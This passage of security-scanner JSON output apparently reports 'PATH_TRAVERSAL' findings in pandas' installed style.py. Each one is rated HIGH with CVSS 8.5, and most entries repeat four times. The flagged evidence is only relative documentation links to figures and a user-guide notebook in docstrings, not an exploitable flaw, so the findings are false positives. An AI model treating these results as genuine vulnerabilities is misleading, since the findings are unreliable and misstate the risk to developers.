            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone.png",
            "context": "        >>> df.style.{name}_gradient(axis=None)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone.png\n\n        Compress the color map from the both ``low`` and ``high`` ends",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2933,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone.png",
            "context": "        >>> df.style.{name}_gradient(axis=None)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone.png\n\n        Compress the color map from the both ``low`` and ``high`` ends",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2933,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone.png",
            "context": "        >>> df.style.{name}_gradient(axis=None)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone.png\n\n        Compress the color map from the both ``low`` and ``high`` ends",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2939,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, low=0.75, high=1.0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png\n\n        Manually setting ``vmin`` and ``vmax`` gradient thresholds",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2939,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, low=0.75, high=1.0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png\n\n        Manually setting ``vmin`` and ``vmax`` gradient thresholds",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2939,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, low=0.75, high=1.0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png\n\n        Manually setting ``vmin`` and ``vmax`` gradient thresholds",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2939,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, low=0.75, high=1.0)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_lowhigh.png\n\n        Manually setting ``vmin`` and ``vmax`` gradient thresholds",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2945,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, vmin=6.7, vmax=21.6)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png\n\n        Setting a ``gmap`` and applying to all columns with another ``cmap``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2945,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, vmin=6.7, vmax=21.6)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png\n\n        Setting a ``gmap`` and applying to all columns with another ``cmap``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2945,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, vmin=6.7, vmax=21.6)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png\n\n        Setting a ``gmap`` and applying to all columns with another ``cmap``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2945,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png",
            "context": "        >>> df.style.{name}_gradient(axis=None, vmin=6.7, vmax=21.6)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_vminvmax.png\n\n        Setting a ``gmap`` and applying to all columns with another ``cmap``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2952,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_gmap.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_gmap.png\n\n        Setting the gradient map for a dataframe (i.e. ``axis=None``), we need to",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2952,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_gmap.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_gmap.png\n\n        Setting the gradient map for a dataframe (i.e. ``axis=None``), we need to",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2952,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_gmap.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_gmap.png\n\n        Setting the gradient map for a dataframe (i.e. ``axis=None``), we need to",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2952,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_gmap.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_gmap.png\n\n        Setting the gradient map for a dataframe (i.e. ``axis=None``), we need to",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2962,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png\n        \"\"\"\n        if subset is None and gmap is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2962,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png\n        \"\"\"\n        if subset is None and gmap is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2962,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png\n        \"\"\"\n        if subset is None and gmap is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 2962,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png",
            "context": "        ... )  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/{image_prefix}_axNone_gmap.png\n        \"\"\"\n        if subset is None and gmap is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3041,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.set_properties(**{'background-color': 'yellow'})  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3041,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.set_properties(**{'background-color': 'yellow'})  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3041,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.set_properties(**{'background-color': 'yellow'})  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3041,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for",
            "context": "        >>> df.style.set_properties(**{'background-color': 'yellow'})  # doctest: +SKIP\n\n        See `Table Visualization <../../user_guide/style.ipynb>`_ user guide for\n        more details.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3130,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ gives",
            "context": "        -----\n        This section of the user guide:\n        `Table Visualization <../../user_guide/style.ipynb>`_ gives\n        a number of examples for different settings and color coordination.\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3130,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ gives",
            "context": "        -----\n        This section of the user guide:\n        `Table Visualization <../../user_guide/style.ipynb>`_ gives\n        a number of examples for different settings and color coordination.\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3130,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ gives",
            "context": "        -----\n        This section of the user guide:\n        `Table Visualization <../../user_guide/style.ipynb>`_ gives\n        a number of examples for different settings and color coordination.\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3130,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ gives",
            "context": "        -----\n        This section of the user guide:\n        `Table Visualization <../../user_guide/style.ipynb>`_ gives\n        a number of examples for different settings and color coordination.\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3218,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3218,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3218,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3218,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3272,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3272,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3272,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3272,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3328,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3328,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3328,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3328,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`Table Visualization <../../user_guide/style.ipynb>`_ for more examples.",
            "context": "\n        Please see:\n        `Table Visualization <../../user_guide/style.ipynb>`_ for more examples.\n        \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3411,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_basic.png",
            "context": "        >>> df.style.highlight_between(left=2.1, right=2.9)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_basic.png\n\n        Using a range input sequence along an ``axis``, in this case setting a ``left``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3411,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_basic.png",
            "context": "        >>> df.style.highlight_between(left=2.1, right=2.9)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_basic.png\n\n        Using a range input sequence along an ``axis``, in this case setting a ``left``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3411,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_basic.png",
            "context": "        >>> df.style.highlight_between(left=2.1, right=2.9)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_basic.png\n\n        Using a range input sequence along an ``axis``, in this case setting a ``left``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3411,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_basic.png",
            "context": "        >>> df.style.highlight_between(left=2.1, right=2.9)  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_basic.png\n\n        Using a range input sequence along an ``axis``, in this case setting a ``left``",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3419,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_seq.png",
            "context": "        ...     axis=1, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_seq.png\n\n        Using ``axis=None`` and providing the ``left`` argument as an array that",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3419,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_seq.png",
            "context": "        ...     axis=1, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_seq.png\n\n        Using ``axis=None`` and providing the ``left`` argument as an array that",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3419,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_seq.png",
            "context": "        ...     axis=1, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_seq.png\n\n        Using ``axis=None`` and providing the ``left`` argument as an array that",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3419,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_seq.png",
            "context": "        ...     axis=1, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_seq.png\n\n        Using ``axis=None`` and providing the ``left`` argument as an array that",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3427,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_axNone.png",
            "context": "        ...     axis=None, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_axNone.png\n\n        Using ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3427,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_axNone.png",
            "context": "        ...     axis=None, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_axNone.png\n\n        Using ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3427,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_axNone.png",
            "context": "        ...     axis=None, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_axNone.png\n\n        Using ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3427,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_axNone.png",
            "context": "        ...     axis=None, color=\"#fffd75\")  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_axNone.png\n\n        Using ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3434,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_props.png\n        \"\"\"\n        if props is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3434,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_props.png\n        \"\"\"\n        if props is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3434,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_props.png\n        \"\"\"\n        if props is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3434,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hbetw_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hbetw_props.png\n        \"\"\"\n        if props is None:",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3510,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_axNone.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_axNone.png\n\n        Or highlight quantiles row-wise or column-wise, in this case by row-wise",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3510,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_axNone.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_axNone.png\n\n        Or highlight quantiles row-wise or column-wise, in this case by row-wise",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3510,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_axNone.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_axNone.png\n\n        Or highlight quantiles row-wise or column-wise, in this case by row-wise",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3510,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_axNone.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_axNone.png\n\n        Or highlight quantiles row-wise or column-wise, in this case by row-wise",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3517,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_ax1.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_ax1.png\n\n        Use ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3517,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_ax1.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_ax1.png\n\n        Use ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3517,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_ax1.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_ax1.png\n\n        Use ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3517,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_ax1.png",
            "context": "        ...  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_ax1.png\n\n        Use ``props`` instead of default background coloring",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3524,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_props.png",
            "context": "        ...     props='font-weight:bold;color:#e83e8c')  # doctest: +SKIP\n\n        .. figure:: ../../_static/style/hq_props.png\n        \"\"\"\n        subset_ = slice(None) if subset is None else subset",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/formats/style.py",
            "line": 3524,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. figure:: ../../_static/style/hq_props.png",
